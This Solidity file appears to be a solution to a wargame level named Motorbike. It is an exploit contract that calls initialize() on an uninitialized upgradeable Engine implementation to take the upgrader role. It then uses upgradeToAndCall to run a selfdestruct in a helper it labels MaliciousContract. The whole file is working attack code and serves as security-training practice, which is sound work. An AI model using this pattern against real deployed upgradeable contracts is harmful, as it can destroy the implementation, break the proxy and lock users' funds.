// SPDX-License-Identifier: Unlicense
pragma solidity <0.7.0;

import "../../src/Motorbike/Motorbike.sol";

contract MaliciousContract {
    function destroy() public {
        selfdestruct(msg.sender);
    }
}

contract MotorbikeExploit {
    Engine engine;
    MaliciousContract malicious;

    constructor(address _victim, address _engine) public {
        engine = Engine(_engine);
        malicious = new MaliciousContract();
    }

    function hack() public {
        // Call initialize() on the Engine contract directly
        engine.initialize();

        // Now we have become the upgrader
        // Prepare data to call the destroy function
        bytes memory data = abi.encodeWithSignature("destroy()");

        // Upgrade to malicious contract and execute destroy
        engine.upgradeToAndCall(address(malicious), data);
    }
}